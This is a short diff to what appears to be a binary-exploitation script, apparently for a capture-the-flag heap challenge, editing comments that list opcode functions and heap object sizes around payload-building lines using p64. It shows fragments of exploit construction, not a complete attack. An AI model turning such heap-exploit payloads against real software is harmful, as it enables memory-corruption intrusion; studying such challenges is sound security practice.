@@ -12,9 +12,9 @@ payload += p64(magic)
 payload += p64(max_buf_offset_Q)
 
 """
-0: fm_to_comp_Q (uninitialized stack var)
+0: fm_to_comp_Q
 1: cache_qword
-2: save_zeros_to_comp_Q (uninitialized stack var)
+2: save_zeros_to_comp_Q
 3: save_cached_qword_to_comp
 """
 
@@ -49,7 +49,7 @@ initial heap structure:
 st_Compress 0x1B8
 st_Compress->buf 0x8
 st_FileManager 0x18
-std::ifstream 0x208
+st_FileManager->file_ifstream 0x208
 """
 
 payload += save_zeros_to_comp_Q(0x3f) * 0x10
